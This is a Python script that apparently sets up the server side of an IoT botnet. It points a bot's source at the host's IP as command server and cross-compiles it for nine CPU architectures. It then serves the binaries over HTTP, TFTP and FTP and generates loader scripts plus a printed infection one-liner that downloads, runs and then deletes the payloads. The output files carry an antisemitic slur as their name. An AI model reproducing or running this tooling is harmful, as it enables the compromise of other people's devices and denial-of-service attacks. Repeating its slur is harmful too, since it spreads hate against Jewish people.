import sys
import time
import subprocess
import warnings
import fileinput
import urllib

def run(cmd):
    subprocess.call(cmd, shell=True)

if len(sys.argv) < 0:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + "\x1b[0m")
    sys.exit(1)
    
bot = "bot.c"
ip = urllib.urlopen('http://api.ipify.org').read()
skid = raw_input("Y/n Get Arch - ")
if skid.lower() == "y":
    run("yum install python-paramiko nano screen gcc perl wget lbzip unzip -y")
    run("service httpd restart") 
    run("service iptables stop")
    get_arch = True
else:
    get_arch = False

compileas = ["fuckjewishpeople.mips",   #mips  
             "fuckjewishpeople.mpsl",   #mpsl  
             "fuckjewishpeople.x86",    #x86   
             "fuckjewishpeople.ppc",    #ppc   
             "fuckjewishpeople.sparc",  #sparc 
             "fuckjewishpeople.arm4",   #arm4  
             "fuckjewishpeople.arm5",   #arm5  
             "fuckjewishpeople.arm6",
             "fuckjewishpeople.arm7"]   #arm6  

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',           #downloading -> mips   
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',         #downloading -> mpsl     
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',         #downloading -> x86      
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',        #downloading -> ppc       
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',          #downloading -> sparc   
           'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',        #downloading -> arm4      
           'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',        #downloading -> arm5      
           'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',   #downloading -> arm6
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2']#downloading -> arm7              

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-x86_64",
       "cross-compiler-powerpc",
       "cross-compiler-sparc",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l",
       "cross-compiler-armv6l",
       "cross-compiler-armv7l"]

try:
    fdsize = open("/usr/include/bits/typesizes.h","r").readlines()
    fdsizew = open("/usr/include/bits/typesizes.h","w").write("")
    for line in fdsize:
        line = line.replace("1024","1000000")
        fdsizew = open("/usr/include/bits/typesizes.h","a").write(line)
    time.sleep(2)
except:
    pass

old1 = "*commServer[] "
new1 = "unsigned char *commServer[] = {\""+ ip +":4258\"};\n"
x  = fileinput.input(files="/root/bot.c", inplace=1)
for line in x:
    if old1 in line:
        line = new1;
    print line,
x.close()

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp")

run("yum install httpd -y")
run("sudo service httpd restart")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

run('''echo -e "listen=YES
local_enable=NO
skid_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/fuckjewishpeople.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/fuckjewishpeople.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
run("service xinetd restart")
run("service httpd restart")
run("ulimit -n 999999; ulimit -u 999999; ulimit -e 999999")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
run('rm -rf cross-compiler-armv4l cross-compiler-armv5l cross-compiler-armv6l cross-compiler-armv7l cross-compiler-i586 cross-compiler-i686 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-powerpc-440fp cross-compiler-sh4 cross-compiler-sparc cross-compiler-x86_64')
print("\x1b check directory /var/www/html to make sure binarys created")
print("skid payload# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *\x1b[0m")